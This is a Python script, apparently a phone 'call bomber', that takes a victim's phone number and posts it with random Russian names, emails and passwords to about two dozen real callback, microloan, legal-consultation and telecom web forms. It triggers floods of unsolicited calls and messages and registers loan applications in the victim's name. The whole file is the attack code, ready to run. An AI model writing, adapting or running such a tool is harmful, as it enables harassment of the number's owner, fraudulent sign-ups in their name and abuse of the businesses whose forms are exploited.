#! /usr/bin/env python
# -*- coding: utf-8 -*-
import requests, datetime, os, random, transliterate, sys
from colorama import Fore
names = (u"Алексей", u"Иван", u"Константин", u"Петр", u"Семен", u"Матвей", u"Станислав", u"Владимир", u"Олег", u"Сергей")
surnames = (u"Иванов", u"Смирнов", u"Кузнецов", u"Попов", u"Васильев", u"Петров", u"Соколов", u"Михайлов", u"Новиков", u"Фёдоров", u"Морозов", u"Волков")
truedata = str(datetime.datetime.today())
truedata = truedata.split (" ")[0]
randomemail = transliterate.translit(random.choice(names),  reversed=True) + transliterate.translit(random.choice(surnames),  reversed=True) + "@gmail.com"
randompassword = transliterate.translit(random.choice(names),  reversed=True) + transliterate.translit(random.choice(surnames),  reversed=True)
randomtimezone = int (random.random () * 10)
randomzaim = int ((random.random () * 10)+10)
problem = "Здравствуйте, у меня есть проблема"
def main ():
	phoneNum = input ("number: ")
	if 1:
		name = random.choice (names)
	try:
		yunker = requests.post ("https://junker.kiev.ua/postmaster.php", data = {"name" : name, "tel" : phoneNum, "action" : "callme"})
		print("ok, wait")
	except:
		print("not ok :(")
	try:
		partner = requests.post ("https://www.big-partner.kh.ua/index.php?route=unishop/request/mail", data = {"type" : "Заказ звонка", "customername" : name, "customerphoneNum" : phoneNum})
		print("ok, wait")
	except:
		print("not ok :(")
	try:
		novo = requests.post ("https://novogodneepostelnoe.ru/index.php?route=extension/module/callback", data = {"name" : name, "phone" : phoneNum, "comment" : "", "action" : "send"})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		bistromoney = requests.post ("https://bistrodengi.ru/ajax/lead.php", data = {"fio": name, "phone": phoneNum})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		zaymigo = requests.post ("https://zaymigo.com/register", data = {"role" : "borrower", "registerphoneNum" : phoneNum, "password" : randompassword, "password_confirm" : randompassword, "register_agreements" : 1, "register_agreements" : 1, "timezone" : randomtimezone, "step" : 1, "sum" : 10000, "repayment_method" : "once", "period" : 12, "promoCode" : "", "appliedPromoCode" : "", "appliedDiscount" : ""})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		zaimexpress = requests.post ("https://www.zaim-express.ru/engine/orders2.php", data = {"type_amount" : 0, "phone" : phoneNum, "source" : "", "clickid" : "", "webid" : "", "reffer" : "www.google.com", "site" : "www.zaim-express.ru/"})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		zaimi = requests.post ("https://xn--80acmlhv0b.xn--80anhm9e.xn--p1ai/gate/public/api/v1/user/phone", data = {"phone" : phoneNum})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		moneza = requests.post ("https://www.moneza.ru/ws/public/callback-request", data = {"clientFullName" : name, "phoneNumber" : phoneNum, "timezoneOffsetString" : -420})	
		print("ok, wait")
	except:
		print("not ok :(")	
	try:
		timezaim = requests.post ("https://timezaim.ru/app/", data = {"SUMMA" : randomzaim, "DAY" : 90, "TARIFname":"", "TARIF" : "main", "SUM" : "", "DAYS" : "", "STEP" : -1, "main" : "Y", "needphoneNum" : phoneNum})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		carmoney = requests.post ("https://telephony.jivosite.com/api/1/sites/359606/widgets/jbgpFn43Y1/clients/"+str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9))+"/telephony/callback", data = {"phone" : phoneNum, "invitationproblem" : ""})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		creditter = requests.post ("https://api.creditter.ru/feedback/phone", json = {"phone": phoneNum})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		creditplus = requests.post ("https://creditplus.ru/wp-core/wp-admin/admin-ajax.php?action=callbackPhone", data = {"number" : phoneNum, "confirmation_code" : "", "action" : "callbackPhone"})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		pliskov = requests.post ("https://telephony.jivosite.com/api/1/sites/6235/widgets/zjrL6mQMKT/clients/"+str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9))+"/telephony/callback", data = {"phone" : phoneNum, "invitationproblem" : ""})
		print("ok, wait")
	except:
		print("not ok :(")		
	try:
		bukvaprava = requests.post("https://bukvaprava.ru/wp-admin/admin-ajax.php", data={"text_quest_banner": problem,"name": name,"city":"Москва","tel": phoneNum,"ip":"192.168.1.777","form_page":"https://bukvaprava.ru/","referer":"","action":"ajax-lead"})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		yuristonline = requests.post("https://www.yurist-online.net/lead_question", data={"region":"27","question": problem,"name": name,"phone": phoneNum,"email":randomemail.lower(),"partner_id":"13"})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		yuridkons = requests.post("https://yuridicheskaya-konsultaciya.com/Home/_FormPost", data={"Name": name, "Phone": phoneNum, "Description": problem})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		epleads = requests.post("https://epleads.ru/gate/api.php", data={"question": problem,"region": "Москва","first_lastname": name,"phone": phoneNum,"ofrid": "1","wid": "3","presetid": "4","referer": "https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html","ip": "213.154.55.496","mobile": "0","template": "form_master.new.fix.metrik_lawyer-blue-default","product": "lawyer","userSoftData": "*"})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		gurist = requests.post("http://www.gurist.ru/wp-json/contact-form-7/v1/contact-forms/3591/feedback", data={"_wpcf7": "3591","_wpcf7_version": "5.0","_wpcf7_locale": "ru_RU","_wpcf7_unit_tag": "wpcf7-f3591-o1","_wpcf7_container_post": "0","your-name": name,"tel-147": problem})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		beeline = requests.post("https://moskva.beeline.ru/customers/products/mobile/services/createmnporder/", data={"leadName":"PodborSim","phone":phoneNum,"region":"98140"})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		mkamsk = requests.post("http://mkamsk.ru/apply_auto_form", data={"Form[9]": name,"Form[12]": phoneNum,"Form[11]": problem,"url": "http://mkamsk.ru/","check": "check"})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		gosurist = requests.post("http://www.gos-urist.ru/send.php", {"name": name, "code": phoneNum, "phone": phoneNum, "issue": problem})
		print("ok, wait")
	except:
		print("not ok :(")	
	try:		
		ur9911030 = requests.post("http://9911030.ru/orderform.php", {"name": name, "phone": phoneNum, "message": problem})
		print("ok, wait")
	except:
		print("not ok :(")	
if __name__ == "__main__":
	main ()
